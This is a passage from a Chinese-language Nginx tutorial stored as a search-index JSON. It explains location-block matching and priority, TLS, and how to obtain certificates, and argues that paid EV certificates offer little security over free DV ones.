\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b default \u200b\u7ad9\u70b9\u200b\u5df2\u7ecf\u200b\u542f\u7528\u200b\n# sudo ln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/\n</code></pre>"},{"location":"ops/network-service/nginx/#complex-location-matching","title":"\u5904\u7406\u200b\u590d\u6742\u200b\u7684\u200b location \u200b\u5339\u914d","text":"<p>\u200b\u5728\u200b location \u200b\u5757\u200b\u91cc\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u6765\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5982\u200b\uff1a</p> <ul> <li><code>proxy_pass http://backend_server;</code>\uff1a\u200b\u53cd\u5411\u200b\u4ee3\u7406\u200b\u3002</li> <li><code>root /var/www/html;</code>\uff1a\u200b\u6307\u5b9a\u200b\u7f51\u7ad9\u200b\u6839\u76ee\u5f55\u200b\u3002</li> <li><code>try_files $uri $uri/ =404;</code>\uff1a\u200b\u5c1d\u8bd5\u200b\u67e5\u627e\u6587\u4ef6\u200b\uff0c\u200b\u5982\u679c\u200b\u627e\u200b\u4e0d\u5230\u200b\u8fd4\u56de\u200b 404 \u200b\u9519\u8bef\u200b\u3002</li> <li><code>return 200 \"Hello, World!\";</code>\uff1a\u200b\u8fd4\u56de\u200b\u6307\u5b9a\u200b\u7684\u200b\u72b6\u6001\u200b\u7801\u200b\u548c\u200b\u5185\u5bb9\u200b\u3002</li> <li><code>include fastcgi_params;</code>\uff1a\u200b\u5bfc\u5165\u200b <code>fastcgi_params</code> \u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5f15\u5165\u200b FastCGI \u200b\u53c2\u6570\u200b\u3002</li> </ul> <p>\u200b\u540c\u65f6\u200b\u5728\u200b\u4e00\u4e2a\u200b <code>server</code> \u200b\u5757\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u591a\u4e2a\u200b <code>location</code> \u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u4e0d\u540c\u200b\u7684\u200b\u8bf7\u6c42\u200b\u8def\u5f84\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u51e0\u79cd\u200b\u5e38\u89c1\u200b\u7684\u200b <code>location</code> \u200b\u5339\u914d\u200b\u65b9\u5f0f\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#location-matching","title":"Location \u200b\u5339\u914d","text":"<p>Nginx \u200b\u9700\u8981\u200b\u51b3\u5b9a\u200b\u7531\u200b\u54ea\u4e2a\u200b <code>location</code> \u200b\u5757\u200b\u6765\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u6839\u636e\u200b\u8bf7\u6c42\u200b\u7684\u200b URI path \u200b\u6765\u200b\u5339\u914d\u200b <code>location</code> \u200b\u5757\u200b\u3002</p> <p>Nginx \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u5339\u914d\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4e3b\u8981\u200b\u901a\u8fc7\u200b <code>location</code> \u200b\u6307\u4ee4\u200b\u540e\u9762\u200b\u7684\u200b\u53ef\u9009\u200b\u4fee\u9970\u7b26\u200b\u6765\u200b\u533a\u5206\u200b\u3002\u200b\u5e38\u7528\u200b\u7684\u200b\u4fee\u9970\u7b26\u200b\u6709\u200b\uff1a</p> \u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff08\u200b\u65e0\u200b\u4fee\u9970\u7b26\u200b\uff09 <p>\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\u662f\u200b\u6700\u200b\u57fa\u672c\u200b\u7684\u200b\u5339\u914d\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ea\u8981\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u5f84\u200b\u4ee5\u200b <code>location</code> \u200b\u5757\u200b\u7684\u200b\u8def\u5f84\u200b\u5f00\u5934\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5339\u914d\u200b\u6210\u529f\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>location /example {\n    # \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b /example \u200b\u548c\u200b /example/xxx\n    return 200 \"This is a prefix match.\";\n}\n</code></pre> <p>\u200b\u591a\u4e2a\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\u65f6\u200b\uff0cNginx \u200b\u4f1a\u200b\u9009\u62e9\u200b\u5339\u914d\u200b\u524d\u7f00\u200b\u6700\u957f\u200b\u7684\u200b <code>location</code> \u200b\u5757\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>location /example { ...; }\nlocation /example/sub { ...; }\n</code></pre> <p>\u200b\u5728\u200b\u6b64\u4f8b\u200b\u4e2d\u200b\uff0c\u200b\u8bf7\u6c42\u200b <code>/example</code>\u3001<code>/example123</code> \u200b\u548c\u200b <code>/example/test</code> \u200b\u4f1a\u200b\u5339\u914d\u200b\u7b2c\u4e00\u4e2a\u200b <code>location</code>\uff1b\u200b\u8bf7\u6c42\u200b <code>/example/sub/page</code> \u200b\u4f1a\u200b\u5339\u914d\u200b\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b <code>location</code>\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u524d\u7f00\u200b\u66f4\u957f\u200b\u3002</p> \u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff08<code>^~</code>\uff09 <p>\u200b\u8fd9\u200b\u662f\u200b\u53e6\u200b\u4e00\u79cd\u200b\u5f62\u5f0f\u200b\u7684\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff0c\u200b\u5339\u914d\u200b\u89c4\u5219\u200b\u4e0e\u200b\u65e0\u200b\u4fee\u9970\u7b26\u200b\u76f8\u540c\u200b\uff0c\u200b\u4f46\u4f1a\u200b\u963b\u6b62\u200b\u540e\u7eed\u200b\u7684\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\u68c0\u67e5\u200b\u3002</p> <pre><code>location ^~ /static/ {\n    # \u200b\u5904\u7406\u200b\u4ee5\u200b /static/ \u200b\u5f00\u5934\u200b\u7684\u200b\u8bf7\u6c42\u200b\n    root /var/www/html/static;\n}\n\nlocation ~ \\.css$ {\n    # \u200b\u5904\u7406\u200b\u4ee5\u200b .css \u200b\u7ed3\u5c3e\u200b\u7684\u200b\u8bf7\u6c42\u200b\n    root /var/www/html/styles;\n}\n</code></pre> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u8bf7\u6c42\u200b\u7684\u200b URI \u200b\u662f\u200b <code>/static/style.css</code>\uff0c\u200b\u5219\u200b\u4f1a\u200b\u5339\u914d\u200b\u5230\u200b\u7b2c\u4e00\u4e2a\u200b <code>location</code> \u200b\u5757\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u662f\u200b\u4ee5\u200b <code>/static/</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff0c\u200b\u4e14\u200b\u4f7f\u7528\u200b\u4e86\u200b <code>^~</code>\uff0cNginx \u200b\u4e0d\u4f1a\u200b\u7ee7\u7eed\u200b\u68c0\u67e5\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\u3002</p> \u200b\u7cbe\u786e\u200b\u5339\u914d\u200b\uff08<code>=</code>\uff09 <p>\u200b\u7cbe\u786e\u200b\u5339\u914d\u200b\uff0c\u200b\u53ea\u6709\u200b\u8bf7\u6c42\u200b\u7684\u200b\u8def\u5f84\u200b\u4e0e\u200b <code>location</code> \u200b\u5757\u200b\u7684\u200b\u8def\u5f84\u200b\u5b8c\u5168\u76f8\u540c\u200b\u65f6\u624d\u200b\u5339\u914d\u200b\uff0c\u200b\u4f18\u5148\u7ea7\u200b\u6700\u9ad8\u200b\u3002</p> <pre><code>location = /example {\n    # \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b /example\n    # \u200b\u4e0d\u200b\u5904\u7406\u200b /example/xxx\n    return 200 \"This is an exact match.\";\n}\n</code></pre> \u200b\u6b63\u5219\u200b\u5339\u914d\u200b\uff08<code>~</code> \u200b\u548c\u200b <code>~*</code>\uff09 <p>\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\u7684\u200b modifier \u200b\u6709\u200b\u4e24\u79cd\u200b\uff0c\u200b\u533a\u5206\u200b\u5927\u5c0f\u5199\u200b\u7684\u200b <code>~</code> \u200b\u4e0e\u200b\u4e0d\u200b\u533a\u5206\u200b\u5927\u5c0f\u5199\u200b\u7684\u200b <code>~*</code>\u3002\u200b\u4e24\u79cd\u200b modifier \u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u90fd\u200b\u662f\u200b\u6700\u4f4e\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>location ~ /example[0-9] {\n    # \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b /example1, /example2, ...\n    return 200 \"This is a case-sensitive regex match.\";\n}\n\nlocation ~ \\.php$ {\n    # \u200b\u5904\u7406\u200b\u4ee5\u200b .php \u200b\u7ed3\u5c3e\u200b\u7684\u200b\u8bf7\u6c42\u200b\n    include fastcgi_params;\n    fastcgi_pass 127.0.0.1:9000;\n}\n\nlocation ~* \\.(jpg|jpeg|png)$ {\n    # \u200b\u5904\u7406\u200b jpg\u3001jpeg \u200b\u548c\u200b png \u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e0d\u200b\u533a\u5206\u200b\u5927\u5c0f\u5199\u200b\n    root /var/www/html/images;\n}\n</code></pre>"},{"location":"ops/network-service/nginx/#location-matching-order","title":"Location \u200b\u5757\u200b\u7684\u200b\u5339\u914d\u200b\u987a\u5e8f","text":"<p>Nginx \u200b\u5728\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u65f6\u4f1a\u200b\u6309\u7167\u200b\u4ee5\u4e0b\u200b\u987a\u5e8f\u200b\u5339\u914d\u200b <code>location</code> \u200b\u5757\u200b\uff1a</p> <ol> <li>\u200b\u7cbe\u786e\u200b\u5339\u914d\u200b (<code>=</code>)\u3002</li> <li> <p>\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff08\u200b\u65e0\u200b\u4fee\u9970\u7b26\u200b\u548c\u200b <code>^~</code>\uff0c\u200b\u6309\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\uff09\u3002</p> <p>\u200b\u5728\u200b\u6b64\u200b\u6b65\u9aa4\u200b\u4e2d\u200b\uff0c\u200b\u6240\u6709\u200b\u65e0\u200b\u4fee\u9970\u7b26\u200b\u548c\u200b <code>^~</code> \u200b\u7684\u200b <code>location</code> \u200b\u5757\u200b\u4f1a\u200b\u4e00\u8d77\u200b\u53c2\u4e0e\u200b\u5339\u914d\u200b\uff0cNginx \u200b\u4f1a\u200b\u9009\u62e9\u200b\u5339\u914d\u200b\u524d\u7f00\u200b\u6700\u957f\u200b\u7684\u200b location\u3002 \u200b\u5728\u200b\u786e\u5b9a\u200b\u4e86\u200b\u6700\u957f\u200b\u524d\u7f00\u200b\u5339\u914d\u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u8be5\u200b <code>location</code> \u200b\u5757\u200b\u4f7f\u7528\u200b\u4e86\u200b <code>^~</code> \u200b\u4fee\u9970\u7b26\u200b\uff0cNginx \u200b\u4f1a\u200b\u505c\u6b62\u200b\u5339\u914d\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8be5\u200b <code>location</code> \u200b\u5757\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff1b\u200b\u5426\u5219\u200b\uff0cNginx \u200b\u4f1a\u200b\u7ee7\u7eed\u200b\u8fdb\u884c\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\u68c0\u67e5\u200b\u3002</p> </li> <li> <p>\u200b\u6b63\u5219\u200b\u5339\u914d\u200b\uff08<code>~</code> \u200b\u548c\u200b <code>~*</code>\uff0c\u200b\u6309\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u51fa\u73b0\u200b\u987a\u5e8f\u200b\u5339\u914d\u200b\uff09\u3002</p> <p>\u200b\u5982\u679c\u200b\u6709\u200b\u5339\u914d\u200b\u5230\u200b\u7684\u200b\u6b63\u5219\u8868\u8fbe\u5f0f\u200b\uff0cNginx \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u8be5\u200b <code>location</code> \u200b\u5757\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002 \u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u5339\u914d\u200b\u5230\u200b\u7684\u200b\u6b63\u5219\u8868\u8fbe\u5f0f\u200b\uff0cNginx \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u7b2c\u4e8c\u6b65\u200b\u4e2d\u200b\u5339\u914d\u200b\u5230\u200b\u7684\u200b\u524d\u7f00\u200b <code>location</code> \u200b\u5757\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u3002</p> </li> </ol>"},{"location":"ops/network-service/nginx/#tls","title":"TLS","text":"<p>TLS \u200b\u662f\u200b\u4e00\u79cd\u200b\u52a0\u5bc6\u200b\u901a\u4fe1\u534f\u8bae\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4fdd\u62a4\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b\u670d\u52a1\u5668\u4e4b\u95f4\u200b\u7684\u200b\u901a\u4fe1\u5b89\u5168\u200b\u3002HTTPS \u200b\u5c31\u200b\u4f7f\u7528\u200b\u4e86\u200b TLS\u3002\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5728\u200b https://cherr.cc/ssl.html \u200b\u627e\u5230\u200b SSL/TLS \u200b\u7684\u200b\u539f\u7406\u200b\u89e3\u91ca\u200b\u3002</p> <p>SSL?</p> <p>\u200b\u5728\u200b\u65e9\u671f\u200b\uff0cHTTPS \u200b\u4f7f\u7528\u200b SSL \u200b\u6765\u200b\u52a0\u5bc6\u200b\u901a\u4fe1\u200b\uff0c\u200b\u4f46\u662f\u200b\u4eba\u4eec\u200b\u540e\u7eed\u200b\u53d1\u73b0\u200b SSL \u200b\u5b58\u5728\u200b\u4e00\u4e9b\u200b\u5b89\u5168\u6f0f\u6d1e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9010\u6e10\u200b\u88ab\u200b TLS \u200b\u53d6\u4ee3\u200b\u3002\u200b\u5c3d\u7ba1\u5982\u6b64\u200b\uff0cSSL \u200b\u8fd9\u4e2a\u200b\u672f\u8bed\u200b\u4ecd\u7136\u200b\u88ab\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5c24\u5176\u200b\u662f\u200b\u5728\u200b\u975e\u6b63\u5f0f\u200b\u573a\u5408\u200b\u4e0b\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cSSL \u200b\u548c\u200b TLS \u200b\u5728\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u89c6\u4e3a\u200b\u540c\u4e49\u8bcd\u200b\u3002</p> <p>\u200b\u4e00\u822c\u200b\u7684\u200b HTTP \u200b\u76d1\u542c\u200b\u7aef\u53e3\u200b\u662f\u200b 80\uff0cHTTPS \u200b\u76d1\u542c\u200b\u7aef\u53e3\u200b\u662f\u200b 443\uff0c\u200b\u8fd9\u662f\u200b IANA\uff08\u200b\u4e92\u8054\u7f51\u200b\u53f7\u7801\u200b\u5206\u914d\u200b\u5c40\u200b\uff09\u200b\u4e3a\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u534f\u8bae\u200b\u5206\u914d\u200b\u7684\u200b\u6807\u51c6\u200b\u7aef\u53e3\u53f7\u200b\u3002Nginx \u200b\u652f\u6301\u200b TLS \u200b\u534f\u8bae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u914d\u7f6e\u200b HTTPS \u200b\u7ad9\u70b9\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#getting-certificates","title":"\u7533\u8bf7\u200b\u8bc1\u4e66","text":"<p>\u200b\u9996\u5148\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u4e3a\u200b\u4f60\u200b\u7684\u200b\u57df\u540d\u200b\u7533\u8bf7\u200b\u4e00\u4e2a\u200b TLS \u200b\u8bc1\u4e66\u200b\u3002\u200b\u4e00\u822c\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u51e0\u79cd\u200b\u65b9\u5f0f\u200b\uff1a</p> <ul> <li>\u200b\u4f7f\u7528\u200b\u57fa\u4e8e\u200b ACME \u200b\u534f\u8bae\u200b\u7684\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u4f8b\u5982\u200b Let's Encrypt\u3001ZeroSSL \u200b\u7b49\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b Certbot\u3001acme.sh\u3001lego \u200b\u7b49\u200b\u5de5\u5177\u200b\u6765\u200b\u7533\u8bf7\u200b\u548c\u200b\u81ea\u52a8\u200b\u7eed\u671f\u200b\u8bc1\u4e66\u200b\u3002</li> <li>\u200b\u8d2d\u4e70\u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\u3002</li> <li>\u200b\u81ea\u200b\u7b7e\u540d\u200b\u8bc1\u4e66\u200b\uff08\u200b\u4ec5\u200b\u7528\u4e8e\u200b\u6d4b\u8bd5\u73af\u5883\u200b\uff0c\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e2d\u200b\u4f7f\u7528\u200b\uff09\u3002</li> </ul> <p>ngx_http_acme_module</p> <p>Nginx \u200b\u7684\u200b <code>ngx_http_acme_module</code> \u200b\u4e5f\u200b\u5b9e\u73b0\u200b\u4e86\u200b ACME \u200b\u534f\u8bae\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7c7b\u4f3c\u200b Caddy \u200b\u90a3\u6837\u200b\u907f\u514d\u200b\u591a\u4f59\u200b\u7684\u200b\u8bc1\u4e66\u200b\u7ba1\u7406\u5de5\u5177\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8ba9\u200b Nginx \u200b\u81ea\u884c\u200b\u7533\u8bf7\u200b\u548c\u200b\u7eed\u671f\u200b\u8bc1\u4e66\u200b\u3002\u200b\u8be5\u200b\u6a21\u5757\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u7f16\u8bd1\u200b\u5b89\u88c5\u200b\u3002</p> <p>@taoky: \u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\u4e00\u5b9a\u200b\u6bd4\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\u66f4\u597d\u200b\u5417\u200b\uff1f</p> <p>\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u3002\u200b\u7ecf\u5e38\u200b\u6709\u200b\u7684\u200b\u4e00\u79cd\u200b\u8bba\u8c03\u200b\u662f\u200b\uff1a\u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\u56e0\u4e3a\u200b\u4ed8\u200b\u4e86\u200b\u94b1\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6bd4\u200b Let's Encrypt \u200b\u7b49\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\u66f4\u200b\u53ef\u9760\u200b\u3001\u200b\u66f4\u200b\u5b89\u5168\u200b\uff0c\u200b\u4f8b\u5982\u200b\u50cf\u200b\u4e0b\u9762\u200b\u8fd9\u6837\u200b\uff1a</p> <p>\u200b\u5317\u5927\u200b\u7528\u200b\u7684\u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8bc1\u4e66\u200b\u80fd\u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u7f51\u7ad9\u200b\u786e\u5b9e\u200b\u5c5e\u4e8e\u200b\u5317\u4eac\u5927\u5b66\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u770b\u200b\u8bc1\u4e66\u200b\u9881\u53d1\u200b\u5bf9\u8c61\u200b\u7684\u200b\u7ec4\u7ec7\u200b\u680f\u200b\u3002\u200b\u6e05\u534e\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\uff08\u200b\u6ce8\u200b\uff1aLet's Encrypt\uff09\uff0c\u200b\u6ca1\u6709\u200b\u7ec4\u7ec7\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u7f51\u7ad9\u200b\u5c5e\u4e8e\u200b\u6e05\u534e\u5927\u5b66\u200b\u3002\u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\u5927\u6982\u200b\u6bcf\u5e74\u200b\u4e07\u628a\u5757\u200b\uff1f\u200b\u6211\u200b\u4e0d\u200b\u6e05\u695a\u200b\u5177\u4f53\u200b\u884c\u60c5\u200b\uff0c\u200b\u4f46\u4e16\u200b\u4e00\u5927\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u5dee\u200b\u8fd9\u70b9\u200b\u94b1\u200b[\u200b\u5403\u74dc\u200b]</p> <p>\u200b\u8fd9\u91cc\u200b\u5b58\u5728\u200b\u7684\u200b\u51e0\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u8bef\u89e3\u200b\u662f\u200b\uff1a</p> <ol> <li>\u300c\u200b\u5546\u4e1a\u200b\u8bc1\u4e66\u200b\u300d\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u4e00\u5b9a\u200b\u6709\u200b\u7ec4\u7ec7\u200b\u4fe1\u606f\u200b\u3002\u200b\u8bc1\u4e66\u200b\u5206\u4e3a\u200b\u4e09\u79cd\u200b\uff1aDV\uff08Domain Validation\uff0c\u200b\u57df\u540d\u200b\u9a8c\u8bc1\u200b\uff09\u3001OV\uff08Organization Validation\uff0c\u200b\u7ec4\u7ec7\u200b\u9a8c\u8bc1\u200b\uff09\u200b\u548c\u200b EV\uff08Extended Validation\uff0c\u200b\u6269\u5c55\u200b\u9a8c\u8bc1\u200b\uff09\u3002\u200b\u5176\u4e2d\u200b DV \u200b\u8bc1\u4e66\u200b\u53ea\u200b\u9a8c\u8bc1\u200b\u57df\u540d\u200b\u6240\u6709\u6743\u200b\u3002\u200b\u4ee5\u4e0a\u200b\u63d0\u4f9b\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\u7684\u200b\u670d\u52a1\u200b\u53ea\u200b\u7b7e\u7f72\u200b DV \u200b\u8bc1\u4e66\u200b\uff0c\u200b\u800c\u200b\u4ed8\u8d39\u200b CA \u200b\u9664\u4e86\u200b OV \u200b\u548c\u200b EV \u200b\u8bc1\u4e66\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e5f\u200b\u5927\u91cf\u200b\u9500\u552e\u200b DV \u200b\u8bc1\u4e66\u200b\u3002</li> <li>\u200b\u8bc1\u4e66\u200b\u7684\u200b\u6838\u5fc3\u200b\u529f\u80fd\u200b\u662f\u200b\uff1a\u200b\u8bc1\u660e\u200b\u4f60\u200b\u8fde\u63a5\u200b\u7684\u200b\u662f\u200b\u57df\u540d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u52a0\u5bc6\u4f20\u8f93\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4e0d\u7ba1\u200b\u662f\u200b DV\u3001OV \u200b\u8fd8\u662f\u200b EV \u200b\u8bc1\u4e66\u200b\uff0c\u200b\u90fd\u200b\u80fd\u200b\u540c\u7b49\u200b\u5b89\u5168\u200b\u5730\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u3002</li> <li> <p>\u200b\u5728\u200b\u5f88\u4e45\u4ee5\u524d\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4f1a\u200b\u7ed9\u200b EV \u200b\u8bc1\u4e66\u200b\u5728\u200b\u5730\u5740\u680f\u200b\u663e\u793a\u200b\u7ec4\u7ec7\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f46\u662f\u200b\u73b0\u4ee3\u200b\u6d4f\u89c8\u5668\u200b\u65e9\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u8fd9\u4e48\u200b\u505a\u200b\u4e86\u200b\u3002\u200b\u56e0\u4e3a\u200b\uff1a</p> <ul> <li>\u200b\u5927\u90e8\u5206\u200b\u4eba\u200b\u4e0d\u600e\u4e48\u200b\u770b\u200b\u5730\u5740\u680f\u200b\uff0c\u200b\u66f4\u200b\u522b\u8bf4\u200b\u6ce8\u610f\u200b\u5230\u200b\u7ec4\u7ec7\u200b\u4fe1\u606f\u200b\u4e86\u200b\u3002</li> <li>\u200b\u7528\u6237\u200b\u5927\u591a\u200b\u53ea\u200b\u5173\u6ce8\u200b\u662f\u4e0d\u662f\u200b HTTPS\uff08\u200b\u5728\u200b\u5f88\u4e45\u4ee5\u524d\u200b\uff0c\u200b\u5982\u679c\u200b\u7f51\u7ad9\u200b\u662f\u200b HTTPS \u200b\u7684\u8bdd\u200b\uff0c\u200b\u5730\u5740\u680f\u200b\u5de6\u4fa7\u200b\u5bf9\u5e94\u200b\u533a\u57df\u200b\u4f1a\u200b\u662f\u200b\u7eff\u200b\u7684\u200b\uff09\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u523b\u610f\u200b\u53bb\u200b\u533a\u5206\u200b\u8bc1\u4e66\u200b\u7c7b\u578b\u200b\u3002</li> <li>\u200b\u6076\u610f\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u5408\u6cd5\u200b\u6ce8\u518c\u200b\u4e00\u4e2a\u200b\u540d\u79f0\u200b\u76f8\u4f3c\u200b\u7684\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u7136\u540e\u200b\u7533\u8bf7\u200b EV \u200b\u8bc1\u4e66\u200b\u7528\u4e8e\u200b\u8bc8\u9a97\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b EV \u200b\u8bc1\u4e66\u200b\u53ef\u80fd\u200b\u53cd\u800c\u200b\u4f1a\u200b\u5f3a\u5316\u200b\u7528\u6237\u200b\u7684\u200b\u9519\u8bef\u200b\u4fe1\u4efb\u200b\u3002\u200b\u4f8b\u5982\u200b 2017 \u200b\u5e74\u200b\u66fe\u200b\u6709\u200b\u5b89\u5168\u200b\u7814\u7a76\u5458\u200b\u6ce8\u518c\u200b\u4e86\u200b\u540d\u53eb\u200b\u300cIdentity Verified\u300d\uff08\u200b\u8eab\u4efd\u200b\u5df2\u200b\u9a8c\u8bc1\u200b\uff09\u200b\u7684\u200b\u516c\u53f8\u200b\uff0c\u200b\u5e76\u200b\u7533\u8bf7\u200b\u5230\u200b\u4e86\u200b EV \u200b\u8bc1\u4e66\u200b\uff0c \u200b\u540c\u5e74\u200b\u53e6\u4e00\u540d\u200b\u5b89\u5168\u200b\u7814\u7a76\u5458\u200b\u7528\u200b\u4e0d\u5230\u200b 200 \u200b\u7f8e\u5143\u200b\u6210\u529f\u200b\u6ce8\u518c\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b\u300cStripe, Inc.\u300d\u200b\u7684\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u5e76\u200b\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b\u57df\u540d\u200b\u7533\u8bf7\u200b\u5230\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u7684\u200b EV \u200b\u8bc1\u4e66\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5c55\u793a\u200b EV \u200b\u8bc1\u4e66\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u7f3a\u9677\u200b\u3002</li> </ul> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5373\u4f7f\u200b\u7533\u8bf7\u200b EV \u200b\u8bc1\u4e66\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u4ed8\u8d39\u200b CA \u200b\u7684\u200b\u300c\u200b\u80cc\u4e66\u200b\u300d\u200b\u610f\u4e49\u200b\u4e5f\u200b\u975e\u5e38\u200b\u6709\u9650\u200b\u3002\u200b\u81f3\u5c11\u200b\u9664\u975e\u200b\u4f60\u200b\u4e0d\u6015\u200b\u9ebb\u70e6\u200b\uff0c\u200b\u800c\u4e14\u200b\u94b1\u200b\u591a\u200b\u5f97\u200b\u6ca1\u200b\u5730\u65b9\u200b\u82b1\u200b\uff0c\u200b\u5426\u5219\u200b\u6211\u200b\u4e2a\u4eba\u200b\u5e76\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4e3a\u4e86\u200b EV \u200b\u8bc1\u4e66\u200b\u800c\u200b\u82b1\u94b1\u200b\u3002</p> </li> <li> <p>\u200b\u514d\u8d39\u200b\u8bc1\u4e66\u200b\u4f7f\u7528\u200b\u7684\u200b ACME 